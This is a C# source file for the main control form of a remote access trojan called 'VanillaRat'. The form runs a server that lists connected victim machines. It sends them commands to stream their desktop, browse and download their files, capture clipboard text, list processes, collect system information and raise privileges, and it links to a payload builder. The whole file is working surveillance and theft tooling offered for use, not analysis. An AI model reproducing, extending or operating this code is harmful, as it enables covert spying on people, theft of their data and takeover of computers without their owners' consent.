using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telepathy;
using VanillaRat.Classes;
using VanillaRat.Forms;
using static VanillaRat.Classes.Server;

namespace VanillaRat
{
    public partial class Main : Form
    {
        Settings.Values Settings;
        public bool RDActive = false;
        public ClientRunningApps CRA = new ClientRunningApps();
        public OpenWebsite OW = new OpenWebsite();
        public ComputerInformation CI = new ComputerInformation();
        public FileExplorer FE = new FileExplorer();
        public ClipboardTextViewer CTV = new ClipboardTextViewer();
        public HardwareUsageViewer HUV = new HardwareUsageViewer();
        public int UpdateImageInterval = 200;
        public int ServerUpdateInterval = 200;
        public Main()
        {
            InitializeComponent();
            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = "Offline";
            GetDataLoop.Interval = ServerUpdateInterval;
            TempDataHelper.CanDownload = true;
            TempDataHelper.CanUpload = true;
        }
        public ListViewItem LVI;
        public int CurrentSelectedID;
        #region Server Controls
        private void btnStartServer_Click(object sender, EventArgs e)
        {
            if (!MainServer.Active)
            {
                try
                {
                    int Port = Settings.GetPort();
                    MainServer.Start(Port);
                    lblStatus.ForeColor = Color.Green;
                    lblStatus.Text = "Online";
                    GetDataLoop.Start();
                    MessageBox.Show("Server started on port " + Port.ToString() + ".", "Server Started", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception EX)
                {
                    MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnStopServer_Click(object sender, EventArgs e)
        {
            if (MainServer.Active)
            {
                lbConnectedClients.Items.Clear();
                MainServer.Stop();
                GetDataLoop.Stop();
                lblStatus.ForeColor = Color.Red;
                lblStatus.Text = "Offline";
                MessageBox.Show("Server stopped.", "Server Stopped", MessageBoxButtons.OK, MessageBoxIcon.Information);
            } 

        }
        #endregion
        #region Builder & Settings
        private void btnSettings_Click(object sender, EventArgs e)
        {
            SettingsForm SF = new SettingsForm();
            SF.Show();
        }
        private void btnBuilder_Click(object sender, EventArgs e)
        {
            BuilderForm BF = new BuilderForm();
            BF.Show();
        }
        #endregion
        #region Server Code
        public void AddClientTag(int ConnectionId, string Tag)
        {
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
                {
                    lbConnectedClients.Items.Remove(LVI);
                }
            }
            ListViewItem ToAdd = new ListViewItem(new string[] { ConnectionId.ToString(), MainServer.GetClientAddress(ConnectionId), Tag });
            lbConnectedClients.Items.Add(ToAdd);
        }
        public void GetRecievedData()
        {
            Telepathy.Message Data;
            while (MainServer.GetNextMessage(out Data))
            {
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        lbConnectedClients.Items.Add(new ListViewItem(new string[] { Data.connectionId.ToString(), MainServer.GetClientAddress(Data.connectionId), "N/A" }));
                        break;
                    case EventType.Disconnected:
                        if (bwUpdateImage.IsBusy)
                        {
                            bwUpdateImage.CancelAsync();
                        }
                        for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
                        {
                            ListViewItem LVI = lbConnectedClients.Items[n];
                            if (LVI.SubItems[0].Text.Contains(Data.connectionId.ToString()))
                            {
                                lbConnectedClients.Items.Remove(LVI);
                            }
                        }                      
                        break;
                    case EventType.Data:
                        HandleData(Data.connectionId, Data.data);
                        break;
                }
            }
        }
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            ClientRunningApps CRA;
            string ASCIIForm = Encoding.ASCII.GetString(RawData);
            byte[] ToProcess = RawData.Skip(1).ToArray();
            //Process type of data
            switch(RawData[0])
            {
                case 0: //Image Type
                    ImageToDisplay = ByteArrayToImage(ToProcess);
                    break;
                case 1: //Notification Type
                    if (Encoding.ASCII.GetString(ToProcess).Contains("Error Downloading:"))
                    {
                        if (DFF.Visible)
                        {
                            DFF.Close();
                        }
                    }
                    MessageBox.Show(Encoding.ASCII.GetString(ToProcess), "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                case 2: //Client Tag Type
                    AddClientTag(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
                case 3: //Process Type
                    UpdateRunningAppsListbox(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
                case 4: //Information Type
                    UpdateComputerInformation(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
                case 5: //File List Type
                    UpdateFiles(ConnectionId, Encoding.ASCII.GetString(ToProcess), "");
                    break;
                case 6: //Current Directory Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
                case 7: //Directory Up Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId.ToString())
                    {
                        MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetDF{" + FE.txtCurrentDirectory.Text + "}"));
                    }
                    break;
                case 8: //File Type
                    if (FE.Visible && FE.ConnectionID == ConnectionId)
                    {
                        File.WriteAllBytes(TempDataHelper.DownloadLocation, ToProcess);
                        Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Downloaded Files\");
                        TempDataHelper.DownloadLocation = "";
                        TempDataHelper.CanDownload = true;
                        if (DFF.Visible)
                        {
                            DFF.Close();
                        }
                    }
                    break;
                case 9: //Clipboard Text Type
                    UpdateClipboardTextViewer(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
                case 10: //Hardware Usage Type
                    UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));                   
                    break;               
                default:
                    break;
            }
        }
        public void UpdateHardwareUsage(int ConnectionId, string UsageData)
        {
            if (HUV.Visible && HUV.Text == "Hardware Usage Viewer - " + ConnectionId.ToString())
            {
                double CPUUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("{", "}", UsageData));
                string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                string RamAmount = Functions.GetSubstringByString("[", "]", UsageData);
                double DiskUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("<", ">", UsageData));
                string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                HUV.txtAvailableRam.Text = RamAmount;
                HUV.txtCpuUsage.Text = CPUUsageString;
                HUV.txtDiskUsage.Text = DiskUsageString;
            } else
            {
                HUV = new HardwareUsageViewer();
                HUV.Show();
                HUV.ConnectionID = ConnectionId;
                HUV.Text = "Hardware Usage Viewer - " + ConnectionId.ToString();
                if (HUV.ConnectionID == ConnectionId)
                {

                }
            }
        }
        public void UpdateClipboardTextViewer(int ConnectionId, string ClipboardText)
        {
            if (CTV.Visible && CTV.Text == "Clipboard Text Viewer - " + ConnectionId.ToString())
            {
                CTV.txtClipboardText.Text += Environment.NewLine;
                CTV.txtClipboardText.Text += DateTime.Now.ToString();
                CTV.txtClipboardText.Text += Environment.NewLine;
                CTV.txtClipboardText.Text += ClipboardText;
            } else
            {
                CTV = new ClipboardTextViewer();
                CTV.Show();
                CTV.ConnectionID = ConnectionId;
                CTV.Text = "Clipboard Text Viewer - " + ConnectionId.ToString();
                if (CTV.ConnectionID == ConnectionId)
                {
                    CTV.txtClipboardText.Text = DateTime.Now.ToString();
                    CTV.txtClipboardText.Text += Environment.NewLine;
                    CTV.txtClipboardText.Text += ClipboardText;
                }
            }
        }
        public void UpdateCurrentDirectory(int ConnectionId, string CurrentDirectory)
        {
            if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId.ToString())
            {
                FE.txtCurrentDirectory.Text = CurrentDirectory;
            }
        }
        public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
        {
            string[] FilesArrayRaw = Files.Split(new string[] { "][" }, StringSplitOptions.None);
            string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
            List<string> FilesList = new List<string>(FilesArray);
            if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId.ToString())
            {
                FE.lbFiles.Items.Clear();
                foreach (string S in FilesArray)
                {
                    string Filename = Functions.GetSubstringByString("{", "}", S);
                    string Extension = Functions.GetSubstringByString("<", ">", S);
                    string DateCreated = Functions.GetSubstringByString("[", "]", S);
                    string[] ToAdd = { Filename, Extension, DateCreated };
                    var ListItem = new ListViewItem(ToAdd);
                    FE.lbFiles.Items.Add(ListItem);
                }
            } else
            {
                FE = new FileExplorer();
                FE.Show();
                FE.ConnectionID = ConnectionId;
                FE.Text = "File Explorer - " + FE.ConnectionID;
                if (FE.ConnectionID == ConnectionId)
                {
                    FE.lbFiles.Items.Clear();
                    foreach (string S in FilesArray)
                    {
                        string Filename = Functions.GetSubstringByString("{", "}", S);
                        string Extension = Functions.GetSubstringByString("<", ">", S);
                        string DateCreated = Functions.GetSubstringByString("[", "]", S);
                        string[] ToAdd = { Filename, Extension, DateCreated };
                        var ListItem = new ListViewItem(ToAdd);
                        FE.lbFiles.Items.Add(ListItem);
                    }
                }
            }
        }
        public void UpdateComputerInformation(int ConnectionId, string Info)
        {
            string[] InfoArray = Info.Split(',');
            List<string> InfoList = new List<string>(InfoArray);
            if (CI.Visible && CI.Text == "Computer Information - " + ConnectionId.ToString())
            {
                CI.lbInformation.Items.Clear();
                CI.lbInformation.Items.AddRange(InfoList.ToArray<string>());
                CI.lbInformation.Items.Remove("");
            }
            else
            {
                CI = new ComputerInformation();
                CI.Show();
                CI.ConnectionID = ConnectionId;
                CI.Text = "Computer Information - " + CI.ConnectionID;
                if (CI.ConnectionID == ConnectionId)
                {
                    CI.lbInformation.Items.Clear();
                    CI.lbInformation.Items.AddRange(InfoList.ToArray());
                    CI.lbInformation.Items.Remove("");
                }
            }
        }
        public void UpdateRunningAppsListbox(int ConnectionId, string Processes)
        {
            string[] ProcessesArrayRaw = Processes.Split(new string[] { "][" }, StringSplitOptions.None);
            string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
            List<string> ProcessesList = new List<string>(ProcessesArray);
            ProcessesList.AddRange(ProcessesArray);
            if (CRA.Visible && CRA.Text == "Running Applications - " + ConnectionId.ToString())
            {
                CRA.lbRunningProcesses.Items.Clear();
                foreach (string S in ProcessesArray)
                {
                    string PName = Functions.GetSubstringByString("{", "}", S);
                    string PID = Functions.GetSubstringByString("<", ">", S);
                    string PWindow = Functions.GetSubstringByString("[", "]", S);
                    string[] ToAdd = { PName, PID, PWindow };
                    var ListItem = new ListViewItem(ToAdd);
                    CRA.lbRunningProcesses.Items.Add(ListItem);
                }
            }
            else
            {
                CRA = new ClientRunningApps();
                CRA.Show();
                CRA.ConnectionID = ConnectionId;
                CRA.Text = "Running Applications - " + CRA.ConnectionID;
                if (CRA.ConnectionID == ConnectionId)
                {
                    CRA.lbRunningProcesses.Items.Clear();
                    foreach (string S in ProcessesArray)
                    {
                        string PName = Functions.GetSubstringByString("{", "}", S);
                        string PID = Functions.GetSubstringByString("<", ">", S);
                        string PWindow = Functions.GetSubstringByString("[", "]", S);
                        string[] ToAdd = { PName, PID, PWindow };
                        var ListItem = new ListViewItem(ToAdd);
                        CRA.lbRunningProcesses.Items.Add(ListItem);
                    }
                }
            }
        }
        private void GetDataLoop_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }
        public Image ByteArrayToImage(byte[] ByteArrayIn)
        {
            using (var MS = new MemoryStream(ByteArrayIn))
            {
                try
                {
                    return Image.FromStream(MS);
                } catch { return null; }
            }
        }
        #endregion
        #region Form
        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            MainServer.Stop();
            if (bwUpdateImage.IsBusy)
            {
                bwUpdateImage.CancelAsync();
            }
        }
        private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            e.NewWidth = lbConnectedClients.Columns[e.ColumnIndex].Width;
            e.Cancel = true;
        }
        private void lbConnectedClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ListViewItem LVI = lbConnectedClients.SelectedItems[0];
                CurrentSelectedID = Convert.ToInt16(LVI.SubItems[0].Text);
            } catch { }
        }
        #endregion
        #region Client Functions
        private void btnClientKill_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("KillClient"));
        }

        private void btnClientDisconnect_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("DisconnectClient"));
        }
        private void btnShowClientConsole_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            DialogResult DR = MessageBox.Show("Are you sure you would like to show the client the console? This can not be reversed!", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (DR == DialogResult.Yes)
            {
                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ShowClientConsole"));
            }

        }
        private void btnSendMessageBox_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("MsgBox(<" + txtMessage.Text + ">[" + txtHeader.Text + "]{" + cbButtons.SelectedItem.ToString() + "}" + "/" + cbIcons.SelectedItem.ToString() + @"\)"));
        }
        private void btnPreviewMessage_Click(object sender, EventArgs e)
        {
            MessageBoxButtons MBB = MessageBoxButtons.OK;
            MessageBoxIcon MBI = MessageBoxIcon.None;
            #region Button & Icon conditional statements
            if (cbButtons.SelectedItem == null || cbIcons.SelectedItem == null)
            {
                return;
            }
            if (cbButtons.SelectedItem.Equals("Abort Retry Ignore"))
            {
                MBB = MessageBoxButtons.AbortRetryIgnore;
            }
            else if (cbButtons.SelectedItem.Equals("OK"))
            {
                MBB = MessageBoxButtons.OK;
            }
            else if (cbButtons.SelectedItem.Equals("OK Cancel"))
            {
                MBB = MessageBoxButtons.OKCancel;
            }
            else if (cbButtons.SelectedItem.Equals("Retry Cancel"))
            {
                MBB = MessageBoxButtons.RetryCancel;
            }
            else if (cbButtons.SelectedItem.Equals("Yes No"))
            {
                MBB = MessageBoxButtons.YesNo;
            }
            else if (cbButtons.SelectedItem.Equals("Yes No Cancel"))
            {
                MBB = MessageBoxButtons.YesNoCancel;
            }
            else
            {

            }
            if (cbIcons.SelectedItem.Equals("Asterisk"))
            {
                MBI = MessageBoxIcon.Asterisk;
            }
            else if (cbIcons.SelectedItem.Equals("Error"))
            {
                MBI = MessageBoxIcon.Error;
            }
            else if (cbIcons.SelectedItem.Equals("Exclamation"))
            {
                MBI = MessageBoxIcon.Exclamation;
            }
            else if (cbIcons.SelectedItem.Equals("Hand"))
            {
                MBI = MessageBoxIcon.Hand;
            }
            else if (cbIcons.SelectedItem.Equals("Information"))
            {
                MBI = MessageBoxIcon.Information;
            }
            else if (cbIcons.SelectedItem.Equals("None"))
            {
                MBI = MessageBoxIcon.None;
            }
            else if (cbIcons.SelectedItem.Equals("Question"))
            {
                MBI = MessageBoxIcon.Question;
            }
            else if (cbIcons.SelectedItem.Equals("Stop"))
            {
                MBI = MessageBoxIcon.Stop;
            }
            else if (cbIcons.SelectedItem.Equals("Warning"))
            {
                MBI = MessageBoxIcon.Warning;
            }
            else
            {

            }
            MessageBox.Show(txtMessage.Text, txtHeader.Text, MBB, MBI);
            #endregion
        }
        private void btnOpenFileBrowser_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            GetDirectoryFiles(ConnectionId, "BaseDirectory");
        }
        public void GetDirectoryFiles(int ConnectionId, string Path)
        {
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetDF{" + Path + "}"));
        }
        private void btnGrabClipboard_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetClipboard"));
        }
        #endregion
        #region Remote Desktop
        public Image ImageToDisplay;
        private void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
        {
            while (RDActive)
            {
                try
                {
                    pbDesktop.Image = ImageToDisplay;
                    Thread.Sleep(UpdateImageInterval);
                } catch { }
            }
        }
        private void btnStartRD_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (RDActive)
            {
                return;
            }
            RDActive = true;
            if (bwUpdateImage.IsBusy)
            {
                bwUpdateImage.CancelAsync();
            }           
            bwUpdateImage.RunWorkerAsync();
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRD"));
            ListViewItem LVI = lbConnectedClients.SelectedItems[0];
            string ClientTag = LVI.SubItems[2].Text;
            string IP = LVI.SubItems[1].Text;
            txtStatus.Text = "Currently Streaming: " + ClientTag + " (" + IP + ")";
        }

        private void btnStopRD_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (!RDActive)
            {
                return;
            }
            RDActive = false;
            if (!bwUpdateImage.IsBusy)
            {
                return;
            }
            bwUpdateImage.CancelAsync();
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopRD"));
            txtStatus.Text = "";
        }
        private void lbClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (RDActive)
            {
                RDActive = false;
                txtStatus.Text = "";
            }
        }
        private void btnGetRunningApps_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetProcesses"));
        }
        private void btnOpenWebsite_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            if (OW.Visible && OW.Text == "Open Website - " + ConnectionId)
            {
                return;
            } else
            {
                OW = new OpenWebsite();
                OW.Show();
                OW.ConnectionID = ConnectionId;
                OW.Text = "Open Website - " + OW.ConnectionID;
            }
                
        }
        private void btnOpenComputerInfo_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetComputerInfo"));
        }
        private void btnRaisePerms_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("RaisePerms"));
        }
        private void btnGetHardwareUsage_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartUsageStream"));
        }
     
        #endregion


    }
}
